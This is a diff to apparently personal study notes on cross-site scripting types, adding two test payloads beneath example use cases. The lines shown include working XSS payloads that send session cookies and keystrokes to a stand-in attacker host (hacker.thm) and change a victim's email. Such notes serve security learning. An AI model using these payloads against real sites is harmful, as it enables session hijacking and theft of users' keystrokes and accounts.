@@ -12,6 +12,8 @@ What are the types of XSS attacks?
 - DOM-based XSS
 
 Cross-site Scripting Use-case
+- "onmouseover="alert(1)
+- '-alert(1)-'
 - Session Stealing <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 - Key Logger <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 - Business Logic <script>user.changeEmail('attacker@hacker.thm');</script>
